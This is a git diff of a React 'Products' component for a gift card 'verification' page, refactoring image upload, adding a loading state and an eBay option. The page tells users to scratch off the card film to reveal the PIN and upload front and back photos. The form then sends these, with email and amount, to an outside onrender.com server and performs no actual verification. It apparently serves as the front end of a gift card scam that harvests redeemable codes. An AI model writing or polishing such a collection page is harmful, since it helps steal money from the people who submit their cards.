@@ -1,52 +1,46 @@
-import React from 'react';
+import React, { useState } from 'react';
 import './Products.css';
-import { useState } from 'react';
 import axios from 'axios';
 
-const Products = ({ openModal }) => {  
+const Products = ({ openModal }) => {
     const [giftCardType, setGiftCardType] = useState('');
     const [amount, setAmount] = useState('');
     const [email, setEmail] = useState('');
-    const [frontImage, setFrontImage] = useState("");
-    const [backImage, setBackImage] = useState("");
+    const [frontImage, setFrontImage] = useState('');
+    const [backImage, setBackImage] = useState('');
+    const [loading, setLoading] = useState(false);  // Loading state
 
     // Convert image to base64
-    const convertFrontImageToBase64 = (e) => {
-        let reader = new FileReader();
-        reader.readAsDataURL(e.target.files[0]);
-        reader.onload = () => {
-            setFrontImage(reader.result);
-        };
-        reader.onerror = error => {
-            console.log("Error converting front image: ", error);
-        };
+    const convertToBase64 = (file, setImage) => {
+        const reader = new FileReader();
+        reader.readAsDataURL(file);
+        reader.onload = () => setImage(reader.result);
+        reader.onerror = (error) => console.log('Error converting image:', error);
     };
 
-    const convertBackImageToBase64 = (e) => {
-        let reader = new FileReader();
-        reader.readAsDataURL(e.target.files[0]);
-        reader.onload = () => {
-            setBackImage(reader.result);
-        };
-        reader.onerror = error => {
-            console.log("Error converting back image: ", error);
-        };
-    };
+    const handleFrontImage = (e) => convertToBase64(e.target.files[0], setFrontImage);
+    const handleBackImage = (e) => convertToBase64(e.target.files[0], setBackImage);
 
     // Submit form
-    let submit = async (e) => {
+    const submit = async (e) => {
         e.preventDefault();
+        setLoading(true);  // Start loading
+
         try {
-            alert('submitted...');
-            await axios.post("https://nodedeploy-4m6t.onrender.com", {
+            await axios.post('https://nodedeploy-4m6t.onrender.com', {
                 giftCardType,
                 amount,
                 email,
-                frontImage, // Include frontImage base64
-                backImage   // Include backImage base64
+                frontImage,
+                backImage,
             });
-        } catch (e) {
-            console.log(e);
+
+            // Trigger the modal with gift card details
+            openModal(giftCardType, amount);
+        } catch (error) {
+            console.error('Error submitting the form:', error);
+        } finally {
+            setLoading(false);  // Stop loading after the API call
         }
     };
 
@@ -57,20 +51,20 @@ const Products = ({ openModal }) => {
             </div>
             <div className="headline-text">
                 <p>Select the gift card type and price value, then upload clear images of both the front and back of the card.</p>
-                <br />
                 <span>Please remove the card from its packaging before uploading.*</span><br />
                 <span>Scratch off the film of the card to reveal the pin before upload where applicable.*</span>
             </div>
-            
+
             <div className="product-verify">
                 <form onSubmit={submit}>
                     <label>
-                        <p className='text-guide'>Select gift card type</p> 
+                        <p className="text-guide">Select gift card type</p>
                         <select required onChange={(e) => setGiftCardType(e.target.value)}>
                             <option value="">--Please choose an option--</option>
                             <option value="amazon">AMAZON</option>
                             <option value="amex">AMEX</option>
                             <option value="apple">APPLE</option>
+                            <option value="ebay">EBAY</option>
                             <option value="googleplay">GOOGLEPLAY</option>
                             <option value="macy">MACY</option>
                             <option value="mastercard">MASTERCARD</option>
@@ -84,44 +78,51 @@ const Products = ({ openModal }) => {
                             <option value="uber">UBER CARD</option>
                             <option value="vanillavisa">VANILLA VISA</option>
                             <option value="wallmartvisa">WALLMART VISA</option>
+                            {/* Add more options as needed */}
                         </select>
                     </label>
-                    <br /><br />
-                    
+
                     <label>
-                        <p className='text-guide'>Input Amount:</p> 
-                        <input type="number" required onChange={(e) => setAmount(e.target.value)} />
+                        <p className="text-guide">Input Amount:</p>
+                        <input
+                            type="number"
+                            required
+                            onChange={(e) => setAmount(e.target.value)}
+                        />
                     </label>
-                    <br /><br />
-                    
+
                     <label>
-                        <p className='text-guide'>Want to get newsletter from us?</p> 
-                        <div className="email-section">
-                            <i className="fa-regular fa-envelope"></i>
-                            <input type="text" placeholder='Email' className='email' required onChange={(e) => setEmail(e.target.value)} />
-                        </div>  
+                        <p className="text-guide">Email:</p>
+                        <input
+                            type="email"
+                            placeholder="Email"
+                            required
+                            onChange={(e) => setEmail(e.target.value)}
+                        />
                     </label>
-                    <br /><br />
-                    
-                    {/* Image Upload section */}
+
                     <label>
-                        <p className='text-guide'>Upload front image</p> 
-                        <input type="file" className='file' required onChange={convertFrontImageToBase64} />
-                        {frontImage && <img width={100} height={100} src={frontImage} alt="front" />}
+                        <p className="text-guide">Upload front image</p>
+                        <input type="file" required onChange={handleFrontImage} />
+                        {frontImage && <img src={frontImage} alt="Front" width={100} />}
                     </label>
-                    <br /><br />
-                    
+
                     <label>
-                        <p className='text-guide'>Upload back image</p> 
-                        <input type="file" className='file' required onChange={convertBackImageToBase64} />
-                        {backImage && <img width={100} height={100} src={backImage} alt="back" />}
+                        <p className="text-guide">Upload back image</p>
+                        <input type="file" required onChange={handleBackImage} />
+                        {backImage && <img src={backImage} alt="Back" width={100} />}
                     </label>
-                    <br /><br />
-                    
-                    <button className="btn-verify get-started" type="submit">
-                        VERIFY CARD
+
+                    <button
+                        className="btn-verify get-started"
+                        type="submit"
+                        disabled={loading}  // Disable button while loading
+                    >
+                        {loading ? 'Processing...' : 'VERIFY CARD'}  {/* Show loading text */}
                     </button>
                 </form>
+
+                {loading && <p className="loading-message">Please wait...</p>}  {/* Optional message */}
             </div>
         </div>
     );
